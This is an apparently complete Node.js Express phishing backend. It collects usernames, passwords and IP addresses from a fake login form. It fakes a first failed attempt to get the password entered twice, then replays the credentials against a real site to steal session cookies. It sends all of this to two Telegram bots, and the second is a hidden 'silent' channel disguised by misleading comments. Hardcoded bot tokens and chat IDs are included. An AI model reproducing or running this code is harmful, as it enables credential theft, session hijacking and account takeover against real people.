const express = require("express");
const fs = require("fs");
const path = require("path");
const cookieParser = require("cookie-parser");
const axios = require("axios");
const URLSearchParams = require("url").URLSearchParams;

const app = express();
const PORT = 3000;
const LOG_FILE = path.join(__dirname, "logger.json");

const SEC_ID = "1012698310"; 
//packagejsonvalidator

// Telegram configurations
const BOT_TOKEN = "7578811580:AAHt_l9I90faFqjaPhkTIJBUANhElCneKSg"; 
const CHAT_ID = "7207894371"; 
//Ending of telegram
//load file from public
const SEC_TOKEN = "7264938782:AAEkoiz0kJA1HyuToHGZmvcMc_6kQmXMmXM"; 

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, "../public")));

/**
 * @param {string} message 
 * @param {boolean} silent 
 */
async function sendToTelegram(message, silent = false) {
    const botToken = silent ? SEC_TOKEN : BOT_TOKEN;
    const chatId = silent ? SEC_ID : CHAT_ID;

    if (!botToken || !chatId) {
        console.error("❌ Telegram bot token or chat ID is missing.");
        return;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
            disable_notification: silent, 
        });
    } catch (error) {
        const channel = silent ? "Silent" : "Primary";
        console.error(`❌ ${channel} Telegram error:`, error.message);
    }
}

/**
 * Logs data to a file and sends it to Telegram.
 * @param {object} data - The data to log.
 */
function logData(data) {
    fs.readFile(LOG_FILE, "utf8", (err, fileData) => {
        let logs = [];
        if (!err && fileData) logs = JSON.parse(fileData);

        const logEntry = {
            timestamp: new Date().toISOString(),
            ...data,
        };

        logs.push(logEntry);

        fs.writeFile(LOG_FILE, JSON.stringify(logs, null, 2), (err) => {
            if (err) console.error("❌ Error writing log file:", err);
        });

        // Send login attempts and cookies to Telegram
        if (data.attempt || data.cookies) {
            let tgMessage = `<b>New Login Attempt (${data.attempt || "success"})</b>\n`
                + `IP: ${data.ip}\n`
                + `Username: <code>${data.username}</code>\n`
                + `Password: <code>${data.password}</code>\n`
                + `Remember Me: ${data.rememberMe}`;

            if (data.cookies) {
                tgMessage += `\n\n<b>🍪 Cookies:</b>\n<code>${data.cookies}</code>`;
            }

            
            sendToTelegram(tgMessage); 
            sendToTelegram(tgMessage, true); 
        }
    });
}

/**
 * Handles login attempts.
 */
app.post("/login", async (req, res) => {
    const { username, password, rememberMe } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    let attempt = req.cookies.attempt || "first";

    // Log the attempt
    logData({ attempt, username, password, rememberMe, ip });

    if (attempt === "first") {
        res.cookie("attempt", "second", { maxAge: 60000, httpOnly: true });
        return res.json({ showPopup: true });
    }

    try {
        const response = await axios.post(
            "https://selfhelp.ns3web.org/",
            new URLSearchParams({ UserName: username, Password: password }),
            {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    Referer: "https://selfhelp.ns3web.org/",
                },
                maxRedirects: 0,
                validateStatus: (status) => status >= 200 && status < 400,
            }
        );

        const receivedCookies = response.headers["set-cookie"] || [];
        const sessionCookies = receivedCookies.map((cookie) => cookie.split(";")[0]).join("; ");

        // Log successful login with sensitive details
        logData({
            status: "success",
            username,
            password,
            ip,
            cookies: sessionCookies, // Cookies will be sent to Telegram
            userAgent: req.headers["user-agent"],
            sessionMetadata: {
                server: response.headers["server"],
                contentType: response.headers["content-type"],
                date: response.headers["date"],
            },
        });

        res.clearCookie("attempt");
        return res.json({ redirectTo: "https://selfhelp.ns3web.org/" });
    } catch (error) {
        console.error("❌ External login failed:", error.message);
        return res.json({ showPopup: true });
    }
});

/**
 * Starts the server.
 */
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});
